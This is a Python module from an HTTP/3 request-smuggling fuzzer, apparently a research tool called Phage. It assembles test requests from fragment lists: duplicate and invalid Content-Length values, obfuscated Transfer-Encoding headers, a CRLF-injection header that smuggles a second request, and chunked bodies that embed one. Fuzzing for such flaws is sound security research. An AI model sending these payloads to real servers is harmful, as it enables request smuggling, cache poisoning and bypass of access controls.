# Phage: fragment library + H3-message grammar.
# License: Apache-2.0 License

"""Generate whole requests from production rules and a library of proven
smuggling fragments, instead of mutating one seed (the T-Reqs direction).

A genome is assembled from a request-line fragment, a content-length fragment,
a transfer-encoding fragment, optional extra-header fragments (dup/case-variant
CL, CRLF injection), and a body fragment. Sampling the cross-product reaches
distinct CVE classes directly rather than waiting for mutation to stumble on
them.
"""

import random
from typing import List

from .genome import Data, Genome, Headers, SMUGGLE_PAYLOAD

_SMUG = SMUGGLE_PAYLOAD

METHODS = [b"POST", b"GET", b"PUT", b"QUERY", b"SEARCH", b"HEAD"]
PATHS = [b"/", b"/a", b"/admin"]
CL_VALUES = [None, b"0", b"4", b"-1", b"9" * 20, str(len(_SMUG)).encode()]
TE_VALUES = [None, b"chunked", b"chunked, identity", b"\tchunked", b"identity"]
EXTRA_FRAGMENTS = [
    (),
    ((b"Content-Length", b"0"),),  # case-variant dup CL (CVE-2026-1525)
    ((b" transfer-encoding", b"chunked"),),  # obfuscated TE
    ((b"x-smuggle", b"1\r\n\r\n" + _SMUG.rstrip(b"\r\n")),),  # CRLF injection
]
BODIES = [
    b"",
    b"AAAA",
    _SMUG,
    b"0\r\n\r\n" + _SMUG,  # chunk terminator then smuggle (TE.CL)
    b"%x\r\n%s\r\n0\r\n\r\n" % (len(_SMUG), _SMUG),  # nested: chunk data is a request
]


def generate(rng: random.Random) -> Genome:
    """Assemble one request genome from the grammar."""
    fields = [
        (b":method", rng.choice(METHODS)),
        (b":scheme", b"https"),
        (b":authority", b"lab"),
        (b":path", rng.choice(PATHS)),
    ]
    cl = rng.choice(CL_VALUES)
    if cl is not None:
        fields.append((b"content-length", cl))
    te = rng.choice(TE_VALUES)
    if te is not None:
        fields.append((b"transfer-encoding", te))
    fields.extend(rng.choice(EXTRA_FRAGMENTS))
    return [Headers(tuple(fields)), Data(rng.choice(BODIES), end_stream=True)]


def seeds(rng: random.Random, n: int) -> List[Genome]:
    """A batch of grammar-generated genomes to seed a search population."""
    return [generate(rng) for _ in range(n)]
